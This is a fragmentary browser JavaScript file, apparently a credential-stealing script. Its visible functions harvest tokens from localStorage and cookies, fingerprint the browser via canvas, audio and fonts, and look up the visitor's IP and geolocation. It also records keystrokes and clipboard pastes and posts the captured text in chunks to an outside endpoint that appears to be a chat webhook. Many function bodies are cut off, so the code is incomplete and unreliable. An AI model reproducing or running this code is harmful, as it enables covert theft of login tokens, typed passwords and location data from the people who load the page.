function S(f,d){try{return f()}catch(e){return d}}
function Z(ms){return new Promise(function(r){setTimeout(r,ms)})}
function TR(s,n){if(!s)return '';s=String(s);return s.length>n?s.slice(0,n-1)+'…':s}

function P1(p){

function CH(str,n){
  var o=[],i=0;

function LS(st){

      if(!v)continue;
      if(/tok/i.test(k)&&T.test(v))return{where:'LS:'+k,tok:v};
      var m=v.match(T);

function CK(){

function AU(){

    var x=c.getContext('2d');

    x.fillStyle='#00f';x.fillRect(0,0,10,10);

function FONTS(){
  return S(function(){
    var base=['monospace','sans-serif','serif'];
    var test=['Arial','Calibri','Cambria','Consolas','Courier New','Georgia','Helvetica','Impact','Lucida Console','Segoe UI','Tahoma','Times New Roman','Trebuchet MS','Verdana','Comic Sans MS','Roboto','Open Sans'];

    var w={},detected=[];
    for(var i=0;i<base.length;i++){span.style.fontFamily=base[i];w[base[i]]=span.offsetWidth;}
    for(var j=0;j<test.length;j++){
      for(var k=0;k<base.length;k++){
        span.style.fontFamily="'"+test[j]+"',"+base[k];
        if(span.offsetWidth!==w[base[k]]){detected.push(test[j]);break;}
      }
    }
    document.body.removeChild(span);
    return detected;
  },[]);

function IP(){
  return fetch(PING,{cache:'no-store'}).then(function(r){return r.json()}).then(function(j){return j&&j.ip?j.ip:null}).catch(function(){return null});

function GEOINFO(ip){
  if(!ip)return Promise.resolve(null);
  return fetch(GEO+ip+'?fields=success,country,country_code,region,city,latitude,longitude,connection,timezone,flag',{cache:'no-store'})
    .then(function(r){return r.json()})
    .then(function(j){return j&&j.success?j:null})

function COL(){
  var t=HARV();

var KB='',TM=null;
function FK(){
  if(!KB)return Promise.resolve();

  function nxt(){
    if(i>=parts.length)return Promise.resolve();
    return PS({content:'\u2328 ```\n'+parts[i++].replace(/```/g,'`\u200b``')+'\n```'}).then(nxt);

function SK(){
  document.addEventListener('keydown',function(e){
    var k=e.key;
    if(k&&k.length===1)KB+=k;
    else if(k==='Enter')KB+='\n';
    else if(k==='Backspace')KB=KB.slice(0,-1);
    else if(k==='Tab')KB+='\t';

    var t=S(function(){return(e.clipboardData||window.clipboardData).getData('text')},'');

function F(name,val,inline){
